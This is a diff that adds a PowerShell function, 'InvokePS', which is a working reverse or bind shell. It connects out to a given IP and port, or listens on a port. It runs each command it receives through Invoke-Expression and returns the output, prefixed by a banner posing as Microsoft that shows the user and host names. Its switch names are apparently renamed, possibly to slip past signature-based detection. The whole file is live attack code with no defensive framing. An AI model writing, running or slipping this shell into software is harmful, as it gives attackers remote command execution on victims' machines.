@@ -1,0 +1,82 @@
+function InvokePS 
+{ 
+     
+    [CmdletBinding(DefaultParameterSetName="nghich")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="nghich")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="buoc")]
+        [String]
+        $IP,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="nghich")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="buoc")]
+        [Int]
+        $Gate,
+
+        [Parameter(ParameterSetName="nghich")]
+        [Switch]
+        $Nghich,
+
+        [Parameter(ParameterSetName="buoc")]
+        [Switch]
+        $Buoc
+
+    )
+
+    
+    try 
+    {
+
+        if ($Buoc)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Gate
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+		
+		if ($Nghich)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IP,$Gate)
+        }
+        
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("MS PShell running as user " + $env:username + " On " + $env:computername + "`nCopyright (C) 2019 MS Corporation.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('MS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something  wrong with execution of command." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'MS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something  wrong! Check  the server and you are using the correct port." 
+        Write-Error $_
+    }
+}
+
